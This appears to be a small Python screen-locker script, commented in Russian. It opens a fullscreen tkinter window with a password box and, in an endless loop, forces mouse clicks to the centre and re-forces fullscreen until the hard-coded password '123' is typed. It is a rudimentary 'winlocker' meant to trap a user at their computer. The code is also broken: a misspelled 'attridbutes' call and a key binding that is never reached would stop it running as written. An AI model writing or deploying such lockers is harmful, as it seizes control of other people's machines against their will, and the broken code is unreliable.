import pyautogui
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep
def callback(event):
    global k, entry
    if entry.get() == "123":
        k = True
        
def on_closing():
    click(width/2,height/2)
    moveTo(width/2,height/2)
    root.attridbutes("-fullscreen", True)
    root.update()
    root.bind('<Control-KeyPress-c>', callback)

root = Tk()

#Получаем ширину и высоту экрана
width = root.winfo_screenwidth()
height = root.winfo_screenheight()

#Отроем окно на весь экран
root.attributes("-fullscreen", True)

entry =Entry(root)
entry.place(width=150, height=50, x=width/2-75, y=height/2-25)
lable = Label(root, text="Пиши пароль и жми Ctrl+C")
lable.place(x=width/2-75-130, y=height/2-25-100)
root.update()
sleep(0.2)

#Кликаем в центр окна 
click(width/2,height/2)

#Сброс ключа
k = False

while not k:
    on_closing()

